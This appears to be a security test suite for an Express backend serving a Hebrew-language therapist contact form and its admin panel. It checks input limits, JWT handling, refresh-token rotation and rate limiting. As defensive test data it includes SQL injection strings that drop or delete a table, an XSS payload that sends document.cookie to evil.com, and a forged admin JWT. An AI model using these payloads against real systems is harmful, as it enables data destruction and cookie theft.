import { describe, it, expect } from 'vitest';
import request from 'supertest';
import express from 'express';
import rateLimit from 'express-rate-limit';
import jwt from 'jsonwebtoken';
import { createApp } from '../src/app';
import { submissionsRepo } from '../src/db/submissions.repository';
import { TEST_USER, TEST_PASSWORD } from './setup';

const app = createApp();

// Complete valid payload — individual tests override only the field under test.
const VALID = {
  name: 'דנה',
  phone: '0501234567',
  email: 'dana@example.com',
  topic: 'חרדה ולחץ',
  message: 'הודעת בדיקה',
};

async function getToken(): Promise<string> {
  const res = await request(app)
    .post('/api/admin/login')
    .send({ username: TEST_USER, password: TEST_PASSWORD });
  return res.body.accessToken as string;
}

// ═══════════════════════════════════════════════════════════════════════
// SECTION 1 — Contact form abuse
// ═══════════════════════════════════════════════════════════════════════
describe('Security — Contact form abuse', () => {

  it('SQL injection in name is stored as plain text, not executed', async () => {
    // ATTACK: Attacker puts SQL into a text field hoping it gets executed.
    //   name = "'; DROP TABLE submissions; --"
    // If the server concatenates SQL strings, the single quote closes the string
    // and the DROP TABLE runs. better-sqlite3 uses @name parameterized queries —
    // the value is always treated as data, never as SQL. The table survives.
    const injectedName = "'; DROP TABLE submissions; --";
    const countBefore = submissionsRepo.findAll().length;

    const res = await request(app).post('/api/contact').send({
      ...VALID,
      name: injectedName,
      message: "1' OR '1'='1'; DELETE FROM submissions WHERE 1=1; --",
    });

    expect(res.status).toBe(201); // accepted — the SQL string is just data
    const all = submissionsRepo.findAll();
    expect(all.length).toBe(countBefore + 1); // table still intact
    expect(all[0]!.name).toBe(injectedName);  // stored verbatim
  });

  it('XSS payload in message is accepted and stored verbatim (JSON API is safe)', async () => {
    // ATTACK: Attacker stores <script> tags hoping the admin dashboard renders them as HTML.
    // WHY IT'S SAFE HERE: The server returns JSON — browsers don't execute scripts inside
    // JSON strings. React renders {variable} with automatic escaping so no innerHTML is used.
    // The mailer also escapes HTML before embedding values in the email body.
    const xssName = '<script>alert("hacked")</script>';
    const res = await request(app).post('/api/contact').send({
      ...VALID,
      name: xssName,
      message: '<img src=x onerror="fetch(\'https://evil.com?d=\'+document.cookie)">',
    });

    expect(res.status).toBe(201);
    // Stored exactly as-is — it's the renderer's job to escape, not the API's
    const saved = submissionsRepo.findAll()[0]!;
    expect(saved.name).toBe(xssName);
  });
});

// ═══════════════════════════════════════════════════════════════════════
// SECTION 2 — Input boundary tests
// ═══════════════════════════════════════════════════════════════════════
describe('Security — Input boundaries', () => {

  it('rejects empty name', async () => {
    // ATTACK: Blank name to skip validation or store garbage.
    const res = await request(app).post('/api/contact').send({ ...VALID, name: '' });
    expect(res.status).toBe(400);
    expect(res.body.errors).toContain('שם מלא נדרש');
  });

  it('accepts name at exactly 120 chars (inclusive upper boundary)', async () => {
    // At exactly the limit it must pass — off-by-one would cause false rejections.
    const res = await request(app).post('/api/contact').send({ ...VALID, name: 'א'.repeat(120) });
    expect(res.status).toBe(201);
  });

  it('rejects name at 121 chars (one over the boundary)', async () => {
    const res = await request(app).post('/api/contact').send({ ...VALID, name: 'א'.repeat(121) });
    expect(res.status).toBe(400);
  });

  it('accepts message at exactly 4000 chars (inclusive upper boundary)', async () => {
    const res = await request(app).post('/api/contact').send({ ...VALID, message: 'א'.repeat(4000) });
    expect(res.status).toBe(201);
  });

  it('rejects message at 4001 chars (prevents DB spam / DoS)', async () => {
    // ATTACK: Enormous payloads can fill storage or crash validators.
    const res = await request(app).post('/api/contact').send({ ...VALID, message: 'א'.repeat(4001) });
    expect(res.status).toBe(400);
  });

  it('rejects phone with letters', async () => {
    // ATTACK: Non-numeric phone to inject data or bypass contact filtering.
    // The regex /^[0-9+\-\s()]+$/ blocks it.
    const res = await request(app).post('/api/contact').send({ ...VALID, phone: 'abcdef' });
    expect(res.status).toBe(400);
    expect(res.body.errors).toContain('מספר טלפון לא תקין');
  });

  it('rejects phone shorter than 6 characters', async () => {
    const res = await request(app).post('/api/contact').send({ ...VALID, phone: '123' });
    expect(res.status).toBe(400);
  });

  it('rejects email without @ symbol', async () => {
    // ATTACK: Bad email so the notification goes nowhere, or to stuff the DB.
    const res = await request(app).post('/api/contact').send({ ...VALID, email: 'notanemail' });
    expect(res.status).toBe(400);
    expect(res.body.errors).toContain('אימייל לא תקין');
  });

  it('rejects email that is only an @', async () => {
    const res = await request(app).post('/api/contact').send({ ...VALID, email: '@' });
    expect(res.status).toBe(400);
  });
});

// ═══════════════════════════════════════════════════════════════════════
// SECTION 3 — JWT auth hardening
// ═══════════════════════════════════════════════════════════════════════
describe('Security — JWT forgery and bypass', () => {

  it('blocks protected route with no Authorization header', async () => {
    // ATTACK: Direct API call with no credentials at all.
    // requireAuth middleware rejects before the route handler runs.
    const res = await request(app).get('/api/admin/submissions');
    expect(res.status).toBe(401);
    expect(res.body.code).toBe('unauthorized');
  });

  it('blocks a JWT with a tampered payload (wrong signature)', async () => {
    // ATTACK: Attacker decodes the JWT, changes role to "admin", re-encodes the payload,
    // but cannot reproduce the correct HMAC-SHA256 signature without knowing JWT_SECRET.
    // jwt.verify() compares signatures and throws if they don't match.
    const forged = [
      'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9',          // valid header
      'eyJzdWIiOiJoYWNrZXIiLCJyb2xlIjoiYWRtaW4ifQ',    // {sub:"hacker",role:"admin"}
      'INVALIDSIGNATUREXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX', // garbage signature
    ].join('.');

    const res = await request(app)
      .get('/api/admin/stats')
      .set('Authorization', `Bearer ${forged}`);
    expect(res.status).toBe(401);
  });

  it('blocks a random string presented as a Bearer token', async () => {
    const res = await request(app)
      .get('/api/admin/stats')
      .set('Authorization', 'Bearer thisisnotajwtatall');
    expect(res.status).toBe(401);
  });

  it('blocks an expired access token (even if the signature is valid)', async () => {
    // ATTACK: Attacker steals a token from logs and tries to use it later.
    // jwt.sign with expiresIn:-1 creates a token whose exp is 1 second in the past.
    // jwt.verify checks the exp claim and throws TokenExpiredError.
    // In production, access tokens expire after 15 minutes — this limits the damage
    // window if a token is stolen.
    const expired = jwt.sign(
      { sub: 'admin', role: 'admin' },
      process.env.JWT_SECRET!,
      { expiresIn: -1 }, // negative = already expired when minted
    );
    const res = await request(app)
      .get('/api/admin/stats')
      .set('Authorization', `Bearer ${expired}`);
    expect(res.status).toBe(401);
  });

  it('blocks a re-used (already rotated) refresh token', async () => {
    // ATTACK: Attacker steals a refresh token and tries to keep getting new access tokens.
    // Single-use rotation: each use revokes the presented token and issues a new one.
    // The stolen original token is now in the "revoked" list — 401 on second use.
    const loginRes = await request(app)
      .post('/api/admin/login')
      .send({ username: TEST_USER, password: TEST_PASSWORD });

    const setCookieHeader = (loginRes.headers['set-cookie'] ?? []) as string[];
    const rtCookie = setCookieHeader?.find((c) => c.startsWith('rt='));
    const rtValue = rtCookie?.split(';')[0]; // "rt=<token_value>"
    expect(rtValue).toBeTruthy();

    // First use succeeds and rotates the token
    await request(app)
      .post('/api/admin/refresh')
      .set('Cookie', rtValue!)
      .expect(200);

    // Second use of the same token — already revoked
    const res = await request(app)
      .post('/api/admin/refresh')
      .set('Cookie', rtValue!);
    expect(res.status).toBe(401);
  });

  it('blocks a completely fake refresh cookie value', async () => {
    // ATTACK: Attacker guesses or generates a random refresh token.
    // The server stores SHA-256(token) in the DB. A random string produces a hash
    // that won't match any stored row.
    const res = await request(app)
      .post('/api/admin/refresh')
      .set('Cookie', 'rt=fakefakefakefakefakefakefakefakefake');
    expect(res.status).toBe(401);
  });
});

// ═══════════════════════════════════════════════════════════════════════
// SECTION 4 — Settings endpoint protection
// ═══════════════════════════════════════════════════════════════════════
describe('Security — Settings endpoint protection', () => {

  it('blocks PUT /api/admin/settings with no token', async () => {
    // ATTACK: Unauthenticated API call to redirect notification emails to the attacker.
    // requireAuth middleware returns 401 before the settings route runs.
    const res = await request(app)
      .put('/api/admin/settings')
      .send({ notification_email: 'hacker@evil.com' });
    expect(res.status).toBe(401);
  });

  it('blocks GET /api/admin/settings with no token', async () => {
    const res = await request(app).get('/api/admin/settings');
    expect(res.status).toBe(401);
  });

  it('rejects password change with wrong current_password', async () => {
    // ATTACK: Attacker has physical/session access to the admin panel and tries
    // to silently change the password. Defense in depth: verifying the current
    // password is required even inside an authenticated session.
    const token = await getToken();
    const res = await request(app)
      .put('/api/admin/settings')
      .set('Authorization', `Bearer ${token}`)
      .send({ current_password: 'wrongguess', new_password: 'newpass123' });
    expect(res.status).toBe(401);
    expect(res.body.code).toBe('unauthorized');
  });

  it('rejects password change when current_password is omitted entirely', async () => {
    // The Zod settingsSchema uses .refine(): if new_password is set,
    // current_password must also be present. Missing key → 400.
    const token = await getToken();
    const res = await request(app)
      .put('/api/admin/settings')
      .set('Authorization', `Bearer ${token}`)
      .send({ new_password: 'newpass123' }); // no current_password
    expect(res.status).toBe(400);
  });
});

// ═══════════════════════════════════════════════════════════════════════
// SECTION 5 — Rate limiting (mini-app integration)
// ═══════════════════════════════════════════════════════════════════════
describe('Security — Rate limiting behavior', () => {
  // WHY WE TEST WITH A MINI-APP:
  // The real app sets max: isTest ? 1000 : 5. In test mode the limit is effectively
  // disabled so the test suite can send many requests freely. To verify that
  // express-rate-limit itself works correctly, we build a tiny throw-away Express
  // app with a tight limit of 3 inside this test.
  //
  // WHY RATE LIMITING EXISTS:
  //   Contact form:  prevents spam bots flooding the therapist's inbox (max 5/min in prod)
  //   Login endpoint: prevents brute-force password guessing (max 10/15min in prod)

  it('blocks requests after exceeding the configured max', async () => {
    const miniApp = express();
    miniApp.use(express.json());
    miniApp.use(
      rateLimit({
        windowMs: 60_000,
        max: 3,
        standardHeaders: true,
        legacyHeaders: false,
      }),
    );
    miniApp.get('/ping', (_req, res) => res.json({ ok: true }));

    // First 3 allowed
    for (let i = 0; i < 3; i++) {
      await request(miniApp).get('/ping').expect(200);
    }
    // 4th is blocked
    const res = await request(miniApp).get('/ping');
    expect(res.status).toBe(429);
    expect(res.headers['ratelimit-limit']).toBe('3');
  });
});
